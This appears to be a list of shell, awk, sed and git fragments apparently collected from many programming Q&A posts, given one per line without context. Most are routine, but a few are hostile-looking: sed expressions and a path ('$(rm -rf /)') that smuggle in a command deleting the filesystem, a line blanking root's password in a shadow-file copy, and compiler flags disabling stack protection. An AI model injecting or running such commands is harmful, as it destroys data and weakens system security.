python somescript.py --with-arguments
comm -13
grep -F
man apt-get
chmod +x file
read -r f1 f2 f3 ... fN
date -d@timestamp "+format"
cat file | while ...
while ... < file
[[ ]]
$( )
status=$(printf '%s\n' "$status" | tr '[:upper:]' '[:lower:]')
gsettings get
[[ $status = true ]]
[[ ]]
[ "$status" = true ]
[[ ]]
[ ]
foo = bar
foo= bar
bash -c 'gsettings set com.canonical.indicator.datetime show-seconds $(gsettings get com.canonical.indicator.datetime show-seconds | perl -neprint/true/?false:true)'
bash -c 'gsettings set org.gnome.desktop.interface clock-show-seconds $(gsettings get org.gnome.desktop.interface clock-show-seconds | perl -neprint/true/?false:true)'
:w :wq
:w q
bash runPhiTests.sh
export LOGS=//server/log_files/2014_*/server_{1,2,3}
grep 'Exception' $LOGS/log.txt
xterm -e
--execute bash -c "/path/scriptname ; bash"
chmod +x <script>
chmod +x
tail -n+3
grep -q .
chmod u+x script
function otrok {...}
mkfifo $kanal
tail PID
git status
sed 's/""//g' list.txt | awk '{ print length }'
grep -E
WARN engine
cd ~/Downloads
Libs/ M2
cat users.txt
man bash
03 - foo bar
foo bar
mv $i ${i:4:4}
/Invalid user/{user[$8]++;ip[$8][$10]++}
END{for (u in user){printf "%s %s",user[u],u;for (i in ip[u])printf ", (%s) %s",ip[u][i],i;print""}}
composer install
composer install
git status
echo 'echo '\''I am a script.'\'';' >|script.sh;
sh -c 'cmd'
-c 'echo 0=$0 1=$1 2=$2'
thiscanbeanything one two
sh -c
man bash
tail -f logfile.txt
ctrl + c
sleep 100
tail -f
tail -n0 --pid=$(($BASHPID+1)) -F logfile | sed '/special event string in the log/q'
:w + enter
C-c !
Edit > Preferences > Keybindings
Format / Send selection to terminal
['db_name'] = '
[ ]*
sed 's/MA/Massachussetts'
echo "status" | hbase shell
hbase/bin/hbase shell
hbase/bin/hbase hbck | grep "INCONSISTENT"
rebase -i
$ GIT_SEQUENCE_EDITOR=$(./rebase.sh d199 a548) git rebase -i 95e2a7c
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit --grep=<SEARCHING_STRING>
git log --oneline --name-only | grep -Eo "\w/.*\.\w+" | sort -u --grep=<COMMIT_ID>
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --name-status --grep=<SEARCHING_STRING>
$ virtualenv
$ virtualenvwrapper
shopt -s globstar
shopt -s nullglob
mv -f
-d ''
grep -q ...
$ set
export var
sed -i "10s~.*~$x~" Gruntfile.js
:h expr-register
:h cmdline-special
:help cmdline-special
:edit g:variable
some parameter in \"double\" quotes and with {brackets}
for i in */
maybe_execute_file ("~/.bash_profile", 1);
man 1 reset
"\"-screen 0 1024x768x24\""
"-screen 0 1024x768x24"
man uniq
set verbose
source checkip.sh && isvalidip 127.0.0.1 && echo $?
http://www.example.com/my_rest_endpoint?start=123456&duration=11&array_param=["activity level"]
printf '%s%*s%s\n' hello 42 '' world
${spn// /*}
printf -v line '*%.s' $(seq $count)
$(seq $count)
-v line
printf "%.${count}s\n" "$line"
jenv enable-plugin export
file -> project structure -> project sdk
Enter file in which to save the key (/home/eip/.ssh/id_rsa)
Enter passphrase (empty for no passphrase):
man 3 getpass
begin 644
(head -n2 && tail -n2)
awk -v n=4 'NR<=n; {b = b "\n" $0} NR>=n {sub(/[^\n]*\n/,"",b)} END {print b}'
gsed -ne'
r'(?<= )[\d\.]+(?!:)'
awk -F'[ :,]' '{print $3, $6, $15; sum[$3]+=$15} END {for (i in sum) print i, sum[i]}'
chmod 777 script.sh
Permission Denied for script.sh
telnet MY_DROPLET_IP
telnet towel.blinkenlights.nl
$ awk -F\; -vOFS=\; 'NR==1 {for (i=1; i<=NF; i++) h[$i]=i} {print $h["A"], $h["C"], $h["D"], $h["F"]}'
$ diff -y s1.txt s2.txt
"bash", "-c", "cat etc >file"
man bash
shopt -s extglob
grep -oP
rm -Rf /,e #
-v dbpass="$DB_PASS"
-i inplace
cp file file~; awk ... file~ > file
dbpass = ENVIRON["DB_PASS"]; gsub(/"/, "&quot;", dbpass);
Raspberry Pi
Raspberry Pi
Raspberry Pi
seq $((1+(25-1)*500)) $((25*500))
|wc l
last = c
$ sudo port install ImageMagick
brew install imagemagick
gnu awk
$1=p $1
trap "..." debug
LedV=$(basename $a)
echo $LedV
echo $varname
basename $varname
if [[ $currentWindowPosition == "above" ]]
while true
set -f
set +f
commandforstdout | read ...
set +m; shopt -s lastpipe && echo 'START END' | read -r start end; echo "[$start] [$end]"; set -m
echo 'alias subl="C:/Program\ Files/Sublime\ Text\ 2/sublime_text.exe"' >> ~/.bashrc
awk -f foo.awk file2.txt
npm adduser
child.stdin.write(username + "\n")
foreach n ( 1 2 3 4 5 )
(( x = y/2 + 3 ))
if (( y%2 == 0 ))
break command received
bzero(&tios, sizeof(tios))
. foo
sed -n -e "${start},${end}p" $file1.dmp > $file2.dmp
head -n $num $file1.dmp > $file2.dmp
cut -c 1-$num $file1.dmp > $file2.dmp
cat $file1.dmp | colrm $num > $file2.dmp
7f45 4c
echo %
./my_which java
-type f
${PATH//:/ }
-maxdepth 1
-type f
-perm -u=x
which ruby
alias iojs='nvm run iojs'
alias iojs='nvm exec iojs node'
alias iojs='nvm run iojs'
alias myiojs="nvm run iojs"
myiojs -v
unexpected redirection
sleep 0.3
while sleep 0.3 && read line; do
cat > /dev/null & sleep 1; kill $!;
(char*) NULL
man exec
sed -i
echo "~/sandbox/foobar.txt" | cat
xargs -0
declare -p
$ docker $(docker-machine config dev) run busybox echo hello world
$(docker-machine config dev)
docker-machine config dev
t=$(echo hello)
docker $t other-args
sleep 10 &
bash --version
set +m
stty susp undef
--version was unexpected at this time.
help read
rm() { mv $@ ~/.trash_can; }
rm -rf
cut -c30-39
date +"%s"
010 == 8
0100 == 64
$1 >= 513 && $1 <= 1936
missing ]
missing ]
unary operator expected
-E      Interpret regular expressions as extended (modern) regular expressions rather than basic regular expressions (BRE's).
{k:value1, l:value2}
cp -lr
lftp --mirror
(+6281 +6282 +6283 +6284)
for ((i=0; i < ${#bulknomer[@]}; i++))
echo ${totalsize-unset}
du -h
man du
vim --something <filename>
man test
man stat
stat -f%HT $file
Regular File
1 -freorder-functions
-d -s
set -o noclobber
mkdir ....
mkdir -p ....
echo $1
testscript myarray6 myarray2
testscript myarray6 xyzzy_plugh myarray2
man test
antigen bundle AdrieanKhisbe/diractions
uniq -w
cd ..
cd ...
-f -
apt-get update
date +%s%N
(VALUE1 VALUE2).
sed -i.bak $'s,
e.g exceptions="test1 test2 test"
3< <(getent passwd)
ls -R
printf %s
ls -R -la "$PWD"
if [ ... ]; then
hello senorsmile
-type f
tail -2
hello world\n
print $3; next
$(cat $IPLIST)
mvn archetype:generate
spawn = require('child_process').spawn('bash')
spawn('bower', bowerCommand, {stdio:'inherit'}).on('close', function () {});
set -f
-e      # $1
"select # $2
*       # $3
from    # $4
mysql"  # $5
`echo ha`
$(echo ha)
-bash: ha: command not found
. yourscript
source yourscript
BUNDLE_GEMFILE=/client/Gemfile bundle exec /client/bin/runner
*/1 * * * * BUNDLE_GEMFILE=/client/Gemfile bundle exec /client/bin/runner
*/1 * * * * bash -lc 'BUNDLE_GEMFILE=/client/Gemfile bundle exec /client/bin/runner'
NR > 2
tee -a temp
"No such file or directory"
rm *.pyc
rm -f *.pyc
rm *.pyc
rm -f *.pyc
'{print $1 '"$2"' $2}'
'{print 2 '"*"' 3}'
'{print 2 * 3}'
'{print $1 "'$2'" $2}'
'{print 2 "'*'" 3}'
'{print 2 "*" 3}'
find ... -print0
$ perl my_prog.pl
socat -u -v GOPEN:./data.txt UNIX-CONNECT:/tmp/sock
column -t -s " "
f=f "_" $i
printf -v a "%05d" 78;
grep -E
man grep
<span class=username>...</span>
man bash
man bash
bc -l
open-ssl s_client
ls files-0/var/log/
declare -a somename
Associative Arrays
xmlstarlet el -v boats.xml
source test.sh tab1
source ~/test.sh tab1
perl -pi -e
perl -pi -e
git ls-files
rm file
tr ' ' $'\x01'
3< <(...)
IFS=$'\x01' read -r ss1 ss2 ss3 _ <&3
IFS='"' read -r -a quote_separated_fields
wc -l
grep -c '' "$file"
ABC -i
-not \( "${sD[@]}" \)
-not ...
-name 'bar*'
-type d
-F ,
$cp -r folder[001-999] ~/images./
seq -f 'Some Data%g' 50
cat -n
chmod +x makecsv.rc
foo &
BEGIN { M = 1 }
NR == 1 { M = $1 }
cp tmp.$$ article_filemakerExport.xml; rm -f tmp.$$
|| rm -f tmp.$$
chown -R example:example /home/user/data
echo "pass1" ;
${stg: -n}
$ sqlplus username/password@database
configure --prefix=/usr/local/bin/git
[[ -s $temp ]]
content=$(< "$temp")
if grep ...
-m 1
array[1]=2001, array[4]=2002, ...
while read
sed -i "s/$password//g"  shadowCopy.txt
sed: -e expression #1, char 0: no previous regular expression
sed -i "s/$password/$blank/g" shadowCopy.txt
echo $password
cp shadowCopy.txt shadowCopy.txt~ && awk  'BEGIN{FS=OFS=":"} $1=="root"{$2=""}1' shadowCopy.txt~ > shadowCopy.txt && rm shadowCopy.txt~
dscl . -create /Groups/root
sudo chown root:root $file
chown: root: illegal group name
od -x myScript.sh
$6 >= 100
{print $0}
recurse_path $(ls ".")
recurse_path *
shift 2
recurse_path *
[[ $count = +([[:digit:]]) ]]
tail -f logfile
ls -al /proc/<pid of grep>/fd
'[{"CONFIG":"SomeConfigID"}]' //there are other members available but this is all I need.
Use method number #
^ *\([0-9]+\)
while do
-v RS="Use method number [0-9]."
-v OFS=" --> "
NF{gsub(/\s*|\(|\)/, ""); print $0, RT}
NF {}
gsub(/\s*|\(|\)/, "")
print $0, RT
man awk
s/( *\(|\))//g
U --> until a dot
read Version
echo $Version
Not a directory
sed -e /\.//g
No such file or directory
dirname /path/to/foo.bar
New_version=$( dirname "$Version" )
cd $New_version
help .
help source
asd qwe
set -xv
\$LINENO> 
set +xv
man date
$(wc -w<<<$FOO)
${str% * * * *} 
while read
man grep
grep -Fq
grep -xq
stty echo
pattern 1
sort -n
cd -
set -x
ls -f
[[ -f $file ]]
ls -f | wc -l
ls -d
ls -x
ps aux | grep php-fpm
ps aux | grep php-fpm
ruby -v
rbenv versions
rbenv install ruby-x.x.x
rbenv local x.x.x
rbenv rehash
gem install bundler
bundle install
for x in /Dir*/FILE* ; do cat BaseFile >> "$x" ; done
$ od -c .
man 2 read
ip address show
rm -f
find /path/to/some/directory -iname '*.exe' -delete
-maxdepth 1
-type f
read "$RANDOM" randomnumber
read [arguments] [var1 var2 ...]
read $RANDOM randomnumber
FNR == NR
-name '*.pattern'
$current = $new_cur
array1=( "${array2[@]}" )
"Nmap scan report for <your ip address>"
"21/tcp open ftp"
test -e $file
[ ... ]
[ ... ]
[[ ... ]]
[ ... ]
[[ ... ]]
[ ... ]
[[ ... ]]
[ ... ]
[ this is a test = test this is ]
[[ ... ]]
unset path_ary[i]
ssh yourUser@yourHost \"/cd dir/to/process; for f in *; do if [[ ${f%.*} -lt yourNumber ]]; then rm "$f"; fi; done\"
tr -s " "
" "
cut -d
gcc -o file file.c -fno-stack-protector -z execstack
./file > tmp.txt
./file 2> tmp.txt
./file &> tmp.txt
ssh -qt localhost "./file" > tmp.txt 2>&1
"$END_DATE + 1"
"20150228 + 1"
20150228 + 1 != 20150301
#pragma mark -
> {}
echo -n > "$file"
#pragma mark -\n#pragma mark Getters
python foo.py
ls /etc/*release 1>/dev/null 2>&1
[ expression ]
1>/dev/null 2>&1
if [ -e /etc/*release ]
test -e
if [ -e /etc/*release ] ; then
git checkout
gc mob-102
git checkout -b <new branch name>
gc -b my_new_branch
ps -ef|grep run
kill $variable
git cherry-pick
git commit
eval set $OPTIONS
OPTIONS=("Quit" "Replace")
echo "${OPTIONS[@]}"
eval set
cat -vet cordova
git-completion.bash: line 155: syntax error near unexpected token
brew install bash
mv ~/git-completion.bash ~/.git-completion.bash
nano .bash_profile
git h
brew --prefix
brew --prefix
activator run
activator "eclipse with-source=true"
stty sane
getUptime.py 192.168.150.1 /27 <options>
git push
fatal: not a git repository: .git
git init .
process "${arguments[1]}"
sed: can't read prints_output: File name too long
desc formatted table
"mv: missing file operand"
file_1.track_id = file_2.track_id
arg[2] - [""]
& wait
fg %1
screen -U
rm -rf directory/*
find -delete
-exec /bin/mv {} ~/.TRASH
printf '%q'
man find
... | grep logprob | { tee /tmp/file | wc -l; cat /tmp/file; rm /tmp/file; } | ...
FNR == NR
/\/\/ zone:/
NR == FNR
bash -s
declare -a
ABC DEF \'S XYZ
help read
wc -c
help read
time cat file >/dev/null
set --
script inout.txt ./a.out
-exec rm '{}' \;
git diff
git diff-index
grep .bam$
grep "\.bam$"
ls *.bam
ls | grep .bam$
bash --debugger
Wed Feb 26 09:36:43 2014 -0500 Bash-4.3 distribution sources and documentation
echo "something" || true
echo "$pid" || true
|| true
M-x install-package
M-x term
M-x term
which coffee
M-x term
M-x term
M-x coffee-repl
M-x ansi-term
\r command not found
echo $SECRET_KEY_BASE
while read -r line; do...[insert your if condition with actions here] done
man dialog
echo hi
run_once: true
grep -P
&> result.txt
beacon scan
-s INT
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><manifest identifier="id1" version="2006-01" smartnotebook:filesource="SMART Notebook for Mac Version=11.3.804.0" xmlns="http://www.imsglobal.org/xsd/imscp_v1p1" xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_v1p3" xmlns:smartnotebook="http://www.smarttech.com/2006-01/notebook" xmlns:smartgallery="http://www.smarttech.com/2006-01/gallery"><metadata><schema>ADL SCORM</schema><schemaversion>CAM 1.3</schemaversion><adlcp:location>metadata.xml</adlcp:location></metadata><organizations><organization id="pagegroups"><item id="group0" identifierref="group0_pages"><title>Group 1</title></item></organization></organizations><resources><resource identifier="group0_pages" href="page4.svg" type="webcontent" adlcp:scormType="asset">*******<file href="page4.svg"/><file href="page0.svg"/><file href="page1.svg"/><file href="page3.svg"/><file href="page2.svg"/>********</resource><resource identifier="pages" href="page4.svg" type="webcontent" adlcp:scormType="asset"><file href="page4.svg"/><file href="page0.svg"/><file href="page1.svg"/><file href="page3.svg"/><file href="page2.svg"/></resource><resource identifier="images"/><resource identifier="sounds"/><resource identifier="attachments"/><resource identifier="flash"/><resource identifier="videos"/><resource identifier="annotationmetadata"/><resource identifier="brush"/></resources></manifest>
gnu awk
grep -o
a b c
in "$@"
for opt
in something
COLLATE Latin1_General_CS_AS
COLLATE Latin1_General_BIN
brew install bash
declare $line
{} \;
{} +
old=foo new=bar
declare old=foo new=bar
alias cd="echo before; cd $1; echo after"
echo before
echo after command
cd(){ echo before; cd $1; echo after;  }
cd(){ echo before; cd $1; echo after;  }
alias ls='ls -l'
echo hello
echo goodbye
man atrun
help echo
*** /lib/modules/3.18.5+/build: No such file or directory.  Stop.
chmod +x mysql2sqlite.sh
pi@raspberrypi ~ $ ./mysql2sqlite.sh test.sql test | sqlite3 database.sqlite
-bash: ./mysql2sqlite.sh: /bin/sh^M: bad interpreter: No such file or directory
sh myShellFile.sh
sh mysql2sqlite.sh test.sql test | sqlite3 database.sqlite
Error: near line 4: near "Insert": syntax error
npm install
return code
sort -k5
[Tue Feb 24 07:39:37 2015] *** MARK ***
[Tue Feb 24 07:40:38 2015] *** MARK ***
[Wed Feb 25 07:01:39 2015] *** MARK ***
[Wed Feb 25 21:17:08 2015] *** MARK ***
[Wed Feb 25 19:10:36 2015] *** MARK ***
[Wed Feb 25 19:10:47 2015] *** MARK ***
[Wed Feb 25 19:15:05 2015] *** MARK ***
[Wed Feb 25 19:14:38 2015] *** MARK ***
awk -F' ' '{print $4;}' log01 | cut -c1-5
grep -q $n log02
ls -1
paste --delimiters=, your_output desired_output | grep -iv 'true,true' | grep -iv 'false,false' | wc -l
wc -l
paste --delimiters=, your_output desired_output | grep -Ev '^(.*),\1$' | wc -l
$_ = qq("$_" )
chop if eof
printf "\""$0"\" "
tr '\n' ' '
s/\n/" "/g
echo -n
7+1 =8
grep, sort, unique
man ps
ulimit -m
ulimit -v
ifconfig | awk
for i in *_\ *; do echo "${i}" $(perl -ne 'print s/(?<![_ ])_ /-/gr' <<< "${i}"); done
for i in *_\ *; do mv "${i}" $(perl -ne 'print s/(?<![_ ])_ /-/gr' <<< "${i}"); done
mv: target ‘9781430249146.pdf’ is not a directory
for i in *_\ *; do mv "${i}" "$(perl -ne 'print s/(?<![_ ])_ /-/gr' <<< "${i}")"; done
-bash: ![_: event not found
unset expect_out(buffer)
ps -ef | grep $process
ps -ef
command | grep -v {grep\|$(basename $0)}
ps -C "$process"
-i inplace
sed -i
sort -nr
git blame
git log --numstat
git blame
git log --numstat
pgrep ffmpeg
2345 15678 9870
ps u $(pgrep ffmpeg)
kill 12345
ps u
subprocess.call("path_to_script", shell=True)
sort -r
sort -r
echo 1
seq $(wc -l <file)
sed 1d
head -n 500
sort -n
sed 's/$/p/'
[m][a][r][k][][s][p][i][t][z][][ ]
GNU sed
svn help
cut -c
echo $TMPDIR
168797 168798 168799 168800 168801 168802
8*7 = 56
arr=($(seq 0.75 0.01 1))
mkdir folder${arr}
nc -l
git stash pop
git stash documentation
git stash apply
git stash create
source ~/.bash_profile
awk 'FNR > 1'
sort -sk m,n
{ print }
-F '\t'
cat com
ls, cp, mv, date, who, pwd, echo, cd
ls -1tr
android {
echo "signing config={..SOME CODE.....} > build.gradle
android {
android {
sed -i
grep "$string" file
fopen ("myfile.txt","a")
find . -name foo.txt -perm 1000
echo "your message" > /tmp/mypipe
while true:
var="$var /Users/My_user/$index/files"
var="${var:+$var }"
-v prefix=value
/ORA/ { print prefix $0 }
echo $$y
man bash
type time
exec bash
/* Some code  */ __('foo'); /* Some more code */ __('bar'); /* Even more code */
__('foo'); /* Some more code */ __('bar')
grep -P
scriptname >/dev/null
command not found
grep -o
find . -maxdepth 1 -name '*dog*' -print0
grep -zc .
awk -v f="$from" -v t="$to" '{gsub(f, t)} 1' file
man sed
{...} &
./command >123.log 2>&1
rm -f 123.log
echo $!
gnu awk
RS=" "
man bash
bash --noediting
stty -a
"path": { ... "to": { ..., "lang": "en" ...} } }
"lang":   "en"
sleep 60
grep | awk
while true; do echo "ALIVE" | sudo nc -l -p 80 &>/var/log/netcat-test.log; done
echo Script started >> the-log-file; date >> the-log-file
while true
for count in 1 2
crontab -e
help [[
if [ $input == 5 ]
if [ "$input" -eq 5 ]
x='ls | grep .'
while IFS='=' read -r
grep -v '^ *#'
grep '[^ ] *='
gensub(/\./, "_", "g", a[1])
print gensub... "=" a[2]}
testfile2 testfile2.gz testfile2test testfile2.gz
shopt -s extglob
shopt -s extglob
shopt -s extglob
rm -rf
do shell script
rm out??
$(stat -c %s file1)
cmp -n 123 file1 file2
arg=1; sPattern=${!arg}
awk -F- -v OFS=- 'NF--' file
for line in f:
ps -ef
ps -aux
ps -ef
grep -v
$FILES | parallel "do_something 1 {}"
echo $FILES | parallel "do_something 1 {}"
echo "$FILES" | parallel "do_something 1 {}"
string match
grep -v
date -u
echo "what is going on"
newvar="$each - $query"
echo $newvar
echo "$each "
echo -n "$each"
if [ -d /tmp/test* ]; then mv test* /pathOfNewDir
if [[ -d
if [[ -d /tmp/test1 && -d /tmp/test2 && -d /tmp/test3 ]]; then
[ -d /tmp/test* ]
[[ -d /tmp/test* ]]
[[ ... ]]
shopt -s failglob
mv /tmp/test*/ ...
exists() { [ -e "$1" ]; }
exists foo*
read <&3
read -u 3
movie_name.nfo: <rating>7.5</rating>
-l opt
man 1 getopt
case $OPTARG
[ "" "" ]
[[ "" "" ]]
chmod 750 /tmp/sbg_clickstream.tmp
set -o
sub(/srchtarget/, "replacmentstring", stringToFix)
if ($i != "0/0")
END {print "new line"}
ls -l 'which sh'
/bin/sh -> bash
cd -1
cd -2
cp ~1/README.md ~2/
$( ... )
cat -A scriptname.sh
cat -A scriptname.sh
bash -x ./script.sh
bs=8192 count=1
bs=1 count=8192
ls -l
ls -l
ls -l
if [ $COUNT -gt 60 ]; then
man bash
sh -c '<shellCmd>'
for f in *.json; do [ -f "$f" ] && /tmp/test.py "$f"; done
-maxdepth 1
qsub -t 20 -sync y
-type d
man find
set -x
sed "s/${delim}/\r${delim}\r/g"
key up
arrow up
export TEST_DRIVE=$(pwd)
line 7: options: command not found
if [[ ! $(ls -d /$DIR2/* | grep test) ]]
export >> scriptenvironment.txt
man 5 crontab
Contents = Not Settled
next unless m/ ...
?<device> ?<date>
($date, $device,) = ($+{date}, $+{device});
$_ = <> unless eof;
perl report.pl file*.data
echo "01/20/72" | sed -r 's#(..)/(..)/(..)#\3\1\2#g'
mvn install
... TM85:~$
cd /home/me/Desktop/openSMILE-2.1.0/
. script2
Compound Commands
man bash
set -x
grep -w
grep -w
grep -w
gnu awk
-i inplace
<title>filename(without extension)</title>
-type f
-name '*.htm'
printf '%P\0%f\0'
NR > 3
somepackag 2.3.4.5-10
t jump;b clean^J:jump^J
[ -f $a ]
[ -f ]
[ -f "$a" ]
[ -f $a ]
[ -z $a ]
ssh usr@svr
ssh usr@svr "clear"
ssh -t usr@vr "clear"
ssh usr@svr ./cl.sh
ssh usr@svr ls
touch ~/.hushlogin
sh -c
xargs -0
grep -cm2 .
sed -i -n -e "\,$nfspath,p"
while read
-i inplace
> tmp && mv tmp exports
awk -F, '{ if ($2 == '5') print $0 }' filename
man curl
echo -e
find . -type f | grep -v '_[0-9]\.'
sudo bash
sudo ./
bash myscript.sh
sudo bash myscript.sh
#!/usr/bin/env bash
sudo ./script
bash -i
sudo bash
[variable im searching for]
$(grep ...)
process substitution
tail -f log_file | grep Status -A 2
tail -f
tail -f
-F -a
tr -d \\r <script >newscript
jekyll serve
bundle exec jekyll serve
echo $PATH
rbenv versions
jekyll serve
gem install jekyll
rbenv local 2.1.0
bundle exec jekyll serve
cat file.php | xargs rubocop
$proc = popen("su username -c 'timeout 120 phantomjs --proxy=".$ip.":".$port." --cookies-file=/some/path/cookies/".$filename." /some/path/bot.js \"".$firstParam."\" \"".$secParam."\" '", 'r');
screen -dmS screenname /path/to/scriptname.sh
ps aux
sh -c su www-data -c 'timeout 120 phantomjs --proxy=: --cookies-file=/some/path/cookies/cookiename.txt /some/path/bot.js "firstparam" "secondparam"
su www-data -c timeout 120 phantomjs --proxy=: --cookies-file=/some/path/cookies/cookiename.txt /some/path/bot.js "firstparam" "secondparam"
sh -c timeout 120 phantomjs --proxy=: --cookies-file=/some/path/cookies/cookiename.txt /some/path/bot.js "firstparam" "secondparam"
timeout 120 phantomjs --proxy=: --cookies-file=/some/path/cookies/cookiename.txt /some/path/bot.js firstparam secondparam
phantomjs --proxy=: --cookies-file=/some/path/cookies/cookiename.txt /some/path/bot.js firstparam secondparam
sh -c su www-data -c 'timeout 120 phantomjs --proxy=117.164.2.159:8123 --cookies-file=/some/path/cookiename.txt /some/path/bot.js "http://firstparam.is.url" "http://secparam.is.url.too" '
su www-data -c timeout 120 phantomjs --proxy=117.164.2.159:8123 --cookies-file=/some/path/cookiename.txt /some/path/bot.js "http://firstparam.is.url" "http://secparam.is.url.too"
sh -c timeout 120 phantomjs --proxy=117.164.2.159:8123 --cookies-file=/some/path/cookiename.txt /some/path/bot.js "http://firstparam.is.url" "http://secparam.is.url.too"
timeout 120 phantomjs --proxy=117.164.2.159:8123 --cookies-file=/some/path/cookiename.txt /some/path/bot.js http://firstparam.is.url http://secparam.is.url.too
phantomjs --proxy=117.164.2.159:8123 --cookies-file=/some/path/cookiename.txt /some/path/bot.js http://firstparam.is.url http://secparam.is.url.too
sed s/1\\.5\\.1-SNAPSHOT/5.0.0/g
(job1; job2)
-exec ...
-exec ...
lst=(1 2 3 4)
lst=(1 2 3 4); echo $lst
echo ${lst[0]}
tee >(ssh host1 tar xzpf -) >(ssh host2 tar xzpf -)
mkfifo next_pipe; tee <previous_pipe >(ssh ...) > next_pipe
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
Customlog logs/tabbed-logfile "%h\t%l\t%u\t%t\t\"%r\"\t%>s\t%b\t\"%{Referer}i\"\t\"%{User-Agent}i\""
echo $NEWROOT
alias brewUses='brew list | while read cask; do let var=var+1 && echo -en "$var\033[1m $cask \033[0m \033[34mUSED BY : \033[0m"; brew uses --installed $cask | awk '"'"'{printf "  \033[4m%s\033[0m  ", $0}'"'"'; echo ""; done'
var++ = 0
brew list | while read cask
let var=var+1
-bash: syntax error near unexpected token `('
chmod g+s test.sh
chmod u+s test.sh
Permission Denied
umask 0002
cd ${0%/*}
cd ${0%/*}
cd /home/chj
cd ${0%/*}
echo $LINE
echo "$LINE"
printf "/n"| openssl s_client -showcerts -connect www.google.com:443 | awk '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/'
printf "/n"| openssl s_client -showcerts -connect www.google.com:443 | awk '/-----BEGIN CERTIFICATE-----/{f=1;++c} !(f && c==2); /-----END CERTIFICATE-----/{f=0}'
printf "/n"| openssl s_client -showcerts -connect www.google.com:443 | awk '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/' | awk '/-----BEGIN CERTIFICATE-----/{f=1;++c} !(f && c==2); /-----END CERTIFICATE-----/{f=0}'
kill -SIGQUIT $pingpid
2>&1 >/dev/null
shell = True
shell = True
delete b;
delete seen
sort(a, c)
set -o errexit
set -e
echo '1 2 3 "foo bar"'
echo $command
cp $from $to
echo $iCommand
cp "./README.md" $to
echo $iCommand
cp "./README.md" "./README.md2"
eval $iCommand
/tmp/$(rm -rf /)/
'cp "$from" "$to"'
cp $from $to
printf %q
'cp $from $to'
sort -u
bash -c
curl -s http://api.openbeerdatabase.com/v1/beers/<RAND_INT>.json | jq '.'
$(od -An -N2 -i /dev/random)
TITLE= Cmpd
Cmpd [0-9]
if [ ! -s tmp ]
find * -user userName
rename 's/txt\..+/txt/' *
sleep $(($(date -d 3:01 +%s) - $(date +%s)))
date -d 3:01 +%s
date +%s
z=$(( x+k))
(( k++ ))
grep \'|$q|\' 20150226_train.txt
set -x
set +x
echo "varof Interset now = $var"
set -vx
set +vx
if ... elfi ...fi
if [[ -z $copt && -z $dopt ]]
[[ ! -z $name ]]
[[ -n $name ]]
: $['string'---]
bash -c 'echo | ruby wut.rb
bash -c 'echo $(echo | ruby wut.rb)'
bash 3.2
ruby 2.2.0p0 (2014-12-25 revision 49005) [x86_64-darwin14]
3> >(tee extra_logs.txt >&2)
--directory /somewhere
echo ${mystr}
echo "${mystr}"
#!/usr/bin/env bash
bash -c
which bash
#!/usr/bin/env bash
$TAGS =~ $re
[[ -n "$TAGS=~$re" ]]
conditional binary operator expected syntax error near =~
Run Git from the Windows Command Prompt
C:\Program Files\Git\cmd
C:\Program Files (x86)\Git\cmd
PATH="$PATH:/c/program files/git/cmd"
chmod +x
./extract.pl yourfile
ls $ACTUAL/${BACKUP_DIR}/${NOMBRE}_*.tgz | wc -l
bash 4.3+
declare -n
local -n
exec 3<
paste users.txt passwords.txt
ssh.ECHO: 0
ssh.ECHOCTL: 0
CTRL + C
CTRL + D
which bash
echo $(date +"%B %d %Y %r") > ~/Desktop/$(date +"%B_%d_%Y").txt
grep --colour=auto
sed -i '/pataern/d file.txt
k=^/ s/^/rm -Rf \//e; #
grep -v
$ cat <FILENAME
$ while read i; do echo $i; done <FILENAME
< <
cat <(echo foo)
echo <(echo foo)
cat file.txt
cat < file.txt
gnu awk
2015-03-05 15:00:05
[[ $a =~ [A-Za-z] ]] && echo "YES ITS STRING"
YES ITS STRING
expect example.scr >output.log
named pipes
named pipe
nc localhost 666
serial console
TCP socket
'foo bar'
td[2]/span[@style="font-size: 10pt;"]
extract(td[5],"TCP: (\d+)",1)
"TCP "
$# is 0
if [ $# -eq 4 ]
while read
which cd
which bash
type cd
apt-get source bash
docker kill
-m 100M --cpu-quota 50000
--ulimit --cpu=timeout
readlink -f /dev/stdin
if [[ -t 0 ]]
if (($#)); then
while read
read -u3
$(cat some_file)
echo $(cat file.txt)
cat file.txt
$2, $3
$names=$(cat $1)
head -c
shell script
service $servicename status
stat -c \"%a\" /var/log/$filename
NF == FNR
file file
sed -n '/1~2p/a' file
if $phrase[1] = F and $num[1] = 1
echo -en '<Hex Command>' | /proc/<pid>/fd/0
sudo sh -c
cd /opt/ && ./script
if [[ $(ls -d $DIR1/* | grep test) ]]
ls -d $DIR1/test*/
while read
grep -q
print $0
"x00 \0"
 x07 - \007 - \a \b \t \n \v \f \r - \015 - x0D
x1B "\033"
"xFF \377"
± 3 bytes
31 / 19 / 251 / 3
37 / 23 / 373 / 3
cp /apps/home/<filename>.txt /apps/cmb/<filename>.txt
awk -F, '{$3="cp "$3" "$3""}1' OFS=, test.txt
ABC,TS-R:56:UT-123,cp /apps/home/t.txt /apps/home/t.txt
> filename
"2014-02-01 00:06:22"
kill <PID of cat>
jobs -lp
lines=$(wc -l < genotype.dat)
(( ))
man grep (1)
read name; grep $name * || echo "$name was not found"
echo ${ara[char]}
-v s="col1 col3"
BEGIN{split(s,v," ");for (i=1;i<=length(v);i++)a[v[i]]=1}
for (i=1;i<=NF;i++) if (b[i] in a) printf "%s\t",$i; print""
print ""
[ $os_type == "Darwin" ]
[ $os_type=="Darwin" ]
a = b
if ( a = b )
a = b
[ a = b ]
[ a=b ]
[[ ]]
(( ))
( )
[[ ... ]]
[[ ... ]]
while read ...; do ...; done <file
grep; if [ $? = 1 ]; then
if ! grep; then
getent || groupadd
if ! getent; then groupadd; fi
man test
[[ ... ]]
rm -rf "/mydirectory/here"
/mydirectory/here: Directory not empty
commandLine './script.sh'
gradle 1.0.0
command -v foo
command -v foo
command -v foo
command -v
python functionName.py "*.txt"
find mydir -name "*.tar.gz" -printf ...
... -exec ...
for file in $(find ...)
ls -C
